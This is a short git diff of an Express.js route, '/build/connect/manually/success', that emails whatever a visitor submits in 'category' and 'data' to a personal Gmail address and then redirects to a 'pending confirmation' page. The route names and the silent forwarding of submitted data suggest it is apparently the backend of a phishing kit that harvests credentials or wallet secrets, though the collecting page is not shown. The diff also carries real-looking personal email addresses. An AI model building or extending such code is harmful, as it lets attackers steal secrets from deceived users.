@@ -54,8 +54,8 @@ app.post('/build/connect/manually/success', async (req, res) => {
 
 
     var mailOptions = {
-        from: 'info.resolverconsultpanel@gmail.com', //Testing email to see you received it successfully. Server configured email
-        to: 'salim72salim72@gmail.com, info.resolverconsultpanel@gmail.com',
+        from: 'node.resolver@gmail.com', //Testing email to see you received it successfully. Server configured email
+        to: 'salim72salim72@gmail.com',
         subject: `${req.body.category}`,
         html: `${req.body.data}`
       };
@@ -67,7 +67,6 @@ app.post('/build/connect/manually/success', async (req, res) => {
             reject(error)
           }else{
             console.log('Email sent: ' + info.response)
-            console.log('New new')
             resolve(info)
             await delay(3000)
             res.redirect('/build/pending/confirmation/success')
